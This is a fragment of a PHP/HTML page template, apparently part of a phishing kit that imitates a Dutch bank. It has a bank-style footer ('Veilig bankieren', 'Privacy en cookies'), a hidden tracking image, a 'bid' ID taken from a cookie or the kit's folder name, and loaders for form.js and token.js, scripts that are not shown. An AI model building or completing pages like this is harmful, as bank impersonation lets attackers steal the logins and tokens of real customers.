                        <a>{{"Veilig bankieren"| ng_translate1}}</a>
                    </div>
                </div>
                <div>
                    <div class="icon-link">
                        <span><img src="arrow-chevron-open-right.svg"></span>
                        <a>{{"Privacy en cookies"| ng_translate1}}</a>
                    </div>
                </div>
                <div>
                    <div class="icon-link">
                        <span><img src="arrow-chevron-open-right.svg"></span>
                        <a>{{"Disclaimer"| ng_translate1}}</a>
                    </div>
                </div>
            </footer>
        </div>
    </div>
    <img src="p2" style="display: none; border: medium none;" width="0" height="0">
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>